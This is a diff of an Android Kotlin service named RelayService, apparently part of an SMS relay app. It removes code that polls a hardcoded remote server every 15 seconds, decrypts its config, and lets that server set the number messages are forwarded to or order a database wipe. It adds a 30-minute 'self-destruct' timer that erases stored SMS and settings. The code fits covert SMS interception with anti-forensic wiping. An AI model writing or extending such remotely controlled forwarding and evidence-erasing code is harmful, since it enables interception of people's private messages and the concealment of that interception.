@@ -8,8 +8,6 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
-import com.example.BuildConfig
-import com.example.data.SecurityModule
 import com.example.data.SettingsManager
 import com.example.data.SmsDatabase
 import kotlinx.coroutines.CoroutineScope
@@ -18,19 +16,20 @@ import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.runBlocking
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import org.json.JSONObject
 
 class RelayService : Service() {
 
     private lateinit var settingsManager: SettingsManager
     private lateinit var database: SmsDatabase
-    private var pollingJob: Job? = null
 
     override fun onCreate() {
         super.onCreate()
         settingsManager = SettingsManager(this)
+        if (settingsManager.isExpired()) {
+            settingsManager.clearAll()
+            stopSelf()
+            return
+        }
         database = SmsDatabase.getDatabase(this)
         
         createNotificationChannel()
@@ -42,56 +41,22 @@ class RelayService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        startPolling()
+        startSelfDestructTimer()
         return START_STICKY
     }
 
-    private fun startPolling() {
-        if (pollingJob?.isActive == true) return
-        
-        pollingJob = CoroutineScope(Dispatchers.IO).launch {
-            val client = OkHttpClient()
-            while (true) {
-                try {
-                    val apiUrl = BuildConfig.API_URL.ifEmpty { "https://ais-dev-ch3ekvgneiuwt5ad5pmjkq-380075491011.asia-east1.run.app/api/config" }
-                    val request = Request.Builder().url(apiUrl).build()
-                    val response = client.newCall(request).execute()
-                    
-                    if (response.isSuccessful) {
-                        val rawData = response.body?.string() ?: ""
-                        android.util.Log.d("RelayService", "Raw data: $rawData")
-                        
-                        val json = try {
-                            JSONObject(rawData)
-                        } catch (e: Exception) {
-                            val decrypted = SecurityModule.decrypt(rawData)
-                            JSONObject(decrypted)
-                        }
-                        
-                        val status = json.optString("status")
-                        val newTargetNumber = json.optString("target_number")
-                        
-                        if (newTargetNumber.isNotEmpty()) {
-                            settingsManager.targetNumber = newTargetNumber
-                        }
-                        
-                        if (status == "ABORT") {
-                            // Secure Wipe
-                            runBlocking { database.smsDao().clearAll() }
-                        }
-                    }
-                } catch (e: Exception) {
-                    android.util.Log.e("RelayService", "Polling error: ${e.message}")
-                }
-                // Wait for 15 seconds before polling again
-                delay(15_000)
-            }
+    private fun startSelfDestructTimer() {
+        CoroutineScope(Dispatchers.IO).launch {
+            delay(30 * 60 * 1000) // 30 minutes
+            android.util.Log.d("RelayService", "Self-destruct triggered")
+            runBlocking { database.smsDao().clearAll() }
+            settingsManager.clearAll()
+            stopSelf()
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        pollingJob?.cancel()
     }
 
     override fun onBind(intent: Intent?): IBinder? {
